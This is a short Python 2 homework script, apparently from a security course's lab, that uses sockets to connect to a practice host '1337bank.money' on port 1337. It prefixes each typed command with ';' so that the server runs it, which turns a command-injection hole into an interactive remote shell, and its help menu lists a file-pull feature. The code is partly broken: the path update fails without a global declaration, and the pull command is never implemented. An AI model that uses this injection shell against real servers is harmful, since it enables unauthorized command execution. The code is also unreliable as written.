"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here
path = ""

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    #print("IMPLEMENT ME")
    cmds = ""
    x = cmd

    if "shell" in cmd:
        cmd = raw_input()

    if "cd" in cmd:
        path += ";" + cmd
        cmds = path
    else:
        if not path:
            cmds = ";" + cmd
        else:
            cmds = path + ";" + cmd

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    data = s.recv(1024)
    s.send(cmds)
    data = s.recv(1024)
    print(data)


if __name__ == '__main__':
    #print("IMPLEMENT ME")
    path = ""
    i = raw_input()

    while "quit" not in i:
        if i == 'help':
            print("1. shell - Drop into interactive shell and allow users to gracefully exit")
            print("2. pull <remote-path> <local-path> - Download files")
            print("3. help - Shows this help menu")
            print("4. quit - Quit the shell")
        else:
            execute_cmd(i)
        
        i = raw_input()
